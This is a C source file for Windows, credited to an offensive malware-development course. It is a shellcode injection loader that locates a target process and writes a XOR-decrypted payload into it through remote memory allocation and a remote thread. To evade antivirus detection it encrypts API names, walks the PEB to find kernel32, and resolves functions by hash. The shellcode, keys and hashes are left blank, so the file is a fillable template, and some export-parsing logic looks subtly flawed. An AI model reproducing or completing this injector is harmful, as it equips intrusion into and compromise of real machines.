/*
@cocomelonc inspired by RTO malware development course
*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

#define KERNEL32_HASH 0x00000000
#define GETMODULEHANDLE_HASH 0x00000000
#define GETPROCADDRESS_HASH 0x00000000

// shellcode - 64-bit
unsigned char my_payload[] = { };

// encrypted process name
unsigned char my_proc[] = { };

// encrypted functions
unsigned char s_vaex[] = { };
unsigned char s_cth[] = { };
unsigned char s_wfso[] = { };
unsigned char s_wpm[] = { };
unsigned char s_op[] = { };
unsigned char s_clh[] = { };
unsigned char s_p32f[] = { };
unsigned char s_p32n[] = { };
unsigned char s_ct32s[] = { };

// encrypted kernel32.dll
unsigned char s_k32[] = { };

// length
unsigned int my_payload_len = sizeof(my_payload);
unsigned int my_proc_len = sizeof(my_proc);
unsigned int s_vaex_len = sizeof(s_vaex);
unsigned int s_cth_len = sizeof(s_cth);
unsigned int s_wfso_len = sizeof(s_wfso);
unsigned int s_wpm_len = sizeof(s_wpm);
unsigned int s_op_len = sizeof(s_op);
unsigned int s_clh_len = sizeof(s_clh);
unsigned int s_p32f_len = sizeof(s_p32f);
unsigned int s_p32n_len = sizeof(s_p32n);
unsigned int s_ct32s_len = sizeof(s_ct32s);
unsigned int s_k32_len = sizeof(s_k32);

// keys
char my_payload_key[] = "";
char my_proc_key[] = "";
char s_vaex_key[] = "";
char s_cth_key[] = "";
char s_wfso_key[] = "";
char s_wpm_key[] = "";
char s_op_key[] = "";
char s_clh_key[] = "";
char s_p32f_key[] = "";
char s_p32n_key[] = "";
char s_ct32s_key[] = "";
char k32_key[] = "";

typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR Buffer;
} UNICODE_STRING;

struct LDR_MODULE {
  LIST_ENTRY e[3];
  HMODULE base;
  void* entry;
  UINT size;
  UNICODE_STRING dllPath;
  UNICODE_STRING dllname;
};

typedef HMODULE (WINAPI *pGetModuleHandleA)(
  LPCSTR lpModuleName
);

typedef FARPROC (WINAPI *pGetProcAddress)(
  HMODULE hModule,
  LPCSTR  lpProcName
);

typedef LPVOID (WINAPI * pVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
typedef HANDLE (WINAPI * pCreateRemoteThread)(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);
typedef DWORD (WINAPI * pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
typedef BOOL (WINAPI * pWriteProcessMemory)(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);
typedef HANDLE (WINAPI * pOpenProcess)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);
typedef BOOL (WINAPI * pCloseHandle)(HANDLE hObject);
typedef BOOL (WINAPI * pProcess32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
typedef BOOL (WINAPI * pProcess32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
typedef HANDLE (WINAPI * pCreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
  int j;
  j = 0;
  for (int i = 0; i < data_len; i++) {
    if (j == key_len - 1) j = 0;
      data[i] = data[i] ^ key[j];
      j++;
  }
}

DWORD calcMyHash(char* data) {
  DWORD hash = 0x35;
  for (int i = 0; i < strlen(data); i++) {
    hash += data[i] + (hash << 1);
  }
  return hash;
}

static DWORD calcMyHashBase(LDR_MODULE* mdll) {
  char name[64];
  size_t i = 0;

  while (mdll->dllname.Buffer[i] && i < sizeof(name) - 1) {
    name[i] = (char)mdll->dllname.Buffer[i];
    i++;
  }
  name[i] = 0;
  return calcMyHash((char *)CharLowerA(name));
}

static HMODULE getKernel32(DWORD myHash) {
  HMODULE kernel32;
  INT_PTR peb = __readgsqword(0x60);
  auto modList = 0x18;
  auto modListFlink = 0x18;
  auto kernelBaseAddr = 0x10;

  auto mdllist = *(INT_PTR*)(peb + modList);
  auto mlink = *(INT_PTR*)(mdllist + modListFlink);
  auto krnbase = *(INT_PTR*)(mlink + kernelBaseAddr);
  auto mdl = (LDR_MODULE*)mlink;
  do {
    mdl = (LDR_MODULE*)mdl->e[0].Flink;
    if (mdl->base != nullptr) {
      if (calcMyHashBase(mdl) == myHash) { // kernel32.dll hash
        break;
      }
    }
  } while (mlink != (INT_PTR)mdl);

  kernel32 = (HMODULE)mdl->base;
  return kernel32;
}

static LPVOID getAPIAddr(HMODULE h, DWORD myHash) {
  PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
  PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)h + img_dos_header->e_lfanew);
  PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(
    (LPBYTE)h + img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
  PDWORD fAddr = (PDWORD)((LPBYTE)h + img_edt->AddressOfFunctions);
  PDWORD fNames = (PDWORD)((LPBYTE)h + img_edt->AddressOfNames);
  PWORD  fOrd = (PWORD)((LPBYTE)h + img_edt->AddressOfNameOrdinals);

  for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
    LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);

    if (calcMyHash(pFuncName) == myHash) {
      // printf("successfully found! %s - %d\n", pFuncName, myHash);
      return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
    }
  }
  return nullptr;
}

int findMyProc(const char *procname) {
  HANDLE hProcSnap;
  PROCESSENTRY32 pe32;
  int pid = 0;

  HMODULE mod = getKernel32(KERNEL32_HASH);
  pGetModuleHandleA myGetModuleHandleA = (pGetModuleHandleA)getAPIAddr(mod, GETMODULEHANDLE_HASH);
  pGetProcAddress myGetProcAddress = (pGetProcAddress)getAPIAddr(mod, GETPROCADDRESS_HASH);
  HMODULE hk32 = myGetModuleHandleA(s_k32);
  pCloseHandle myCloseHandle = (pCloseHandle)myGetProcAddress(hk32, s_clh);

  XOR((char *) s_p32f, s_p32f_len, s_p32f_key, sizeof(s_p32f_key));
  pProcess32First myProcess32First = (pProcess32First)myGetProcAddress(hk32, s_p32f);

  XOR((char *) s_p32n, s_p32n_len, s_p32n_key, sizeof(s_p32n_key));
  pProcess32Next myProcess32Next = (pProcess32Next)myGetProcAddress(hk32, s_p32n);

  XOR((char *) s_ct32s, s_ct32s_len, s_ct32s_key, sizeof(s_ct32s_key));
  pCreateToolhelp32Snapshot myCreateToolhelp32Snapshot = (pCreateToolhelp32Snapshot)myGetProcAddress(hk32, s_ct32s);

  hProcSnap = myCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

  pe32.dwSize = sizeof(PROCESSENTRY32);

  if (!myProcess32First(hProcSnap, &pe32)) {
    myCloseHandle(hProcSnap);
    return 0;
  }

  while (myProcess32Next(hProcSnap, &pe32)) {
    if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
      pid = pe32.th32ProcessID;
      break;
    }
  }

  myCloseHandle(hProcSnap);

  return pid;
}


int pekabooo(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

  LPVOID pRemoteCode = NULL;
  HANDLE hThread = NULL;

  HMODULE mod = getKernel32(KERNEL32_HASH);
  pGetModuleHandleA myGetModuleHandleA = (pGetModuleHandleA)getAPIAddr(mod, GETMODULEHANDLE_HASH);
  pGetProcAddress myGetProcAddress = (pGetProcAddress)getAPIAddr(mod, GETPROCADDRESS_HASH);
  HMODULE hk32 = myGetModuleHandleA(s_k32);

  // decrypt VirtualAllocEx function call
  XOR((char *) s_vaex, s_vaex_len, s_vaex_key, sizeof(s_vaex_key));
  pVirtualAllocEx myVirtualAllocEx = (pVirtualAllocEx)myGetProcAddress(hk32, s_vaex);
  pRemoteCode = myVirtualAllocEx(hProc, NULL, my_payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);

  // decrypt WriteProcessMemory function call
  XOR((char *) s_wpm, s_wpm_len, s_wpm_key, sizeof(s_wpm_key));
  pWriteProcessMemory myWriteProcessMemory = (pWriteProcessMemory)myGetProcAddress(hk32, s_wpm);
  myWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);

  // decrypt CreateRemoteThread function call
  XOR((char *) s_cth, s_cth_len, s_cth_key, sizeof(s_cth_key));
  pCreateRemoteThread myCreateRemoteThread = (pCreateRemoteThread)myGetProcAddress(hk32, s_cth);
  hThread = myCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);

  if (hThread != NULL) {
    // decrypt WaitForSingleObject function call
    XOR((char *) s_wfso, s_wfso_len, s_wfso_key, sizeof(s_wfso_key));
    pWaitForSingleObject myWaitForSingleObject = (pWaitForSingleObject)myGetProcAddress(hk32, s_wfso);
    myWaitForSingleObject(hThread, 500);

    pCloseHandle myCloseHandle = (pCloseHandle)myGetProcAddress(hk32, s_clh);
    myCloseHandle(hThread);
    return 0;
  }
  return -1;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

  int pid = 0;
  HANDLE hProc = NULL;

  HMODULE mod = getKernel32(KERNEL32_HASH);
  pGetModuleHandleA myGetModuleHandleA = (pGetModuleHandleA)getAPIAddr(mod, GETMODULEHANDLE_HASH);
  pGetProcAddress myGetProcAddress = (pGetProcAddress)getAPIAddr(mod, GETPROCADDRESS_HASH);

  // decrypt kernel32.dll
  XOR((char *) s_k32, s_k32_len, k32_key, sizeof(k32_key));
  HMODULE hk32 = myGetModuleHandleA(s_k32);

  // decrypt CloseHandle function call
  XOR((char *) s_clh, s_clh_len, s_clh_key, sizeof(s_clh_key));
  pCloseHandle myCloseHandle = (pCloseHandle)myGetProcAddress(hk32, s_clh);

  // decrypt process name
  XOR((char *) my_proc, my_proc_len, my_proc_key, sizeof(my_proc_key));

  pid = findMyProc(my_proc);

  if (pid) {
    // decrypt OpenProcess function call
    XOR((char *) s_op, s_op_len, s_op_key, sizeof(s_op_key));
    pOpenProcess myOpenProcess = (pOpenProcess)myGetProcAddress(hk32, s_op);

    // try to open target process
    hProc = myOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
      PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
      FALSE, (DWORD) pid);

    if (hProc != NULL) {
      XOR((char *) my_payload, my_payload_len, my_payload_key, sizeof(my_payload_key));
      pekabooo(hProc, my_payload, my_payload_len);
      myCloseHandle(hProc);
    }
  }
  return 0;
}
